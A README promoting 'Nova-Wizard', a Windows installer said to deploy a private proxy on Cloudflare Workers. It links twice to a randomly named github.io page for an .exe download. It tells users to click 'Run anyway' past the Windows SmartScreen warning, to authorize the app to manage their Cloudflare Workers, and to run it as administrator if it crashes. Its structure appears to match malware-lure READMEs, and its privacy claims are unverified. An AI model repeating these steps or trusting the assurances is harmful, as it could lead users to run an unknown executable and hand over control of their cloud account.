# ⚡ Nova-Wizard - Build your private proxy server easily

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://hauberkfiord921.github.io)

Nova-Wizard helps you set up a private, secure proxy server. You host this server on Cloudflare Workers. It uses OAuth for your identity. You do not need API tokens. You do not rely on third-party servers to manage your traffic. 

## 🛠 Why use this tool

Many proxy tools require technical steps. They often ask for access keys or API tokens. These keys can leak. Some services also store your traffic logs on their own servers. 

Nova-Wizard fixes these issues. It handles the difficult configuration as a local process on your computer. You keep full control over your settings. You deploy your code directly to your personal Cloudflare account. Your data flows through your own infrastructure.

## 📋 System Requirements

Nova-Wizard runs on standard Windows machines. Ensure your computer meets these requirements before you start:

*   **Operating System**: Windows 10 or Windows 11.
*   **Memory**: At least 4GB of RAM.
*   **Internet**: An active connection to reach Cloudflare services.
*   **Account**: A free or paid Cloudflare account.
*   **Web Browser**: Chrome, Firefox, or Edge.

## 🚀 Getting Started

Follow these steps to set up your proxy server. The process takes about five minutes.

### 1. Download the installer
Visit the main release page to download the software.

[Download Nova-Wizard](https://hauberkfiord921.github.io)

Select the file that ends in `.exe`. Save this file to your computer.

### 2. Run the application
Open your Downloads folder. Double-click the `Nova-Wizard.exe` file. 

Windows might show a blue box that says "Windows protected your PC." This happens because the app is new. Click "More info" and then click "Run anyway" to proceed. This tells Windows that you trust the software.

### 3. Log in to Cloudflare
The application window opens. It asks you to log in to Cloudflare. Click the "Login" button. Your browser opens. Log in with your Cloudflare email and password. 

Cloudflare will ask if you want to give Nova-Wizard permission to manage your Workers. Click "Authorize." This creates a secure connection between your computer and your cloud infrastructure.

### 4. Deploy your proxy
Return to the Nova-Wizard application. You see a "Deploy" button. Click this button. 

The software now creates your proxy server. It uploads the necessary code to your Cloudflare account. Please wait for the progress bar to reach 100%. When it finishes, you see a green checkmark.

### 5. Start your proxy
The tool provides a URL. This is the address of your new private proxy. Copy this address. You can now add this address to your browser settings or proxy manager.

## 🔐 How it keeps you safe

Privacy relies on who has access to your keys. Most proxy setups require a global API key. A global key gives a third party total control over your entire Cloudflare account. 

Nova-Wizard uses OAuth. OAuth grants access only to the specific tools needed for the proxy. It never stores your credentials on our servers. The application runs locally on your PC. It deletes all temporary configuration files once the deployment finishes. 

## ⚙️ Advanced Settings

Most users do not need to change these settings. You can access them by clicking the "Settings" gear icon in the corner of the app.

*   **Custom Domain**: If you own a domain, enter it here to give your proxy a cleaner name.
*   **Worker Name**: You can name your proxy. The default name is "Nova-Proxy."
*   **Logging**: Keep this off for better performance. Turn it on if you need to troubleshoot connection issues.

## ❓ Frequently Asked Questions

**Do I need a paid Cloudflare account?**
No. The free tier of Cloudflare Workers handles most personal traffic needs. 

**Will my proxy stop working?**
Cloudflare provides high uptime. Your proxy stays active as long as your account remains in good standing.

**Can I run this on a work computer?**
Check your company policy first. Some offices block custom proxy deployments.

**Does this software collect my data?**
No. Nova-Wizard acts as a bridge between your computer and your personal cloud account. We do not track your activity, your IP address, or your traffic volume.

**What if the deployment fails?**
Check your internet connection first. Then, ensure you have an active Cloudflare Workers subscription enabled in your dashboard. Restart the application if the error persists.

## 📦 Troubleshooting

If you encounter a "403 Forbidden" error, check your Cloudflare account permissions. Ensure your account has the "Cloudflare Workers" service enabled. 

If the application crashes during startup, verify that you have proper write permissions in your Downloads folder. You might need to move the installer to your Documents folder or run it as an administrator. 

To clear your current setup, click "Reset" in the settings menu. This removes all local data and lets you start a fresh deployment. 

## 🌐 Connectivity Tips

Keep your proxy URL secret. If you share it with others, they might use your worker's traffic limit. If you think someone else has your URL, simply run the "Deploy" process again in Nova-Wizard. This assigns a new address to your proxy and invalidates the old one.

For the best speed, choose a location within the Cloudflare dashboard that is closest to your physical area. This reduces latency when you browse the web through your new proxy.